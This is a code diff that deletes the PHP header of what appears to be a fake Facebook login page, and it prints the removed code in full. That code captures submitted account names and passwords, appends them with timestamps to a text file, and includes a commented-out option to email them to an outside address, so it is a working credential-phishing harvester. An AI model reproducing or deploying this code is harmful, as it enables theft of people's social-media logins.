@@ -1,25 +1,3 @@
-<?php
-session_start();
-if(isset($_SESSION['facebook'])){
-    header('location: /');
-    die();
-}
-if(isset($_POST['account'])){
-    $taikhoan = $_POST['taikhoan'];
-    $matkhau = $_POST['matkhau'];
-    $time = date('h:i:s y-m-d');
-    $_SESSION['facebook'] = $taikhoan;
-    $file = fopen("tramsexy.txt","a+");
-    fwrite($file, ''.$taikhoan.'|'.$matkhau.'|'.$time);
-    fwrite($file, "\n");
-    fclose($file); 
-    // nếu muốn gửi mail thì bỏ // lè
-    // $message = ''.$taikhoan.'|'.$matkhau.'|'.$time;
-    // mail('mail@gmail.com', 'Ơn giời facebook đây rồi', $message);
-    echo ("<script>location.href='/'</script>");
-}
-$time = time();
-?>
 <!DOCTYPE html>
 <html>
 <head>
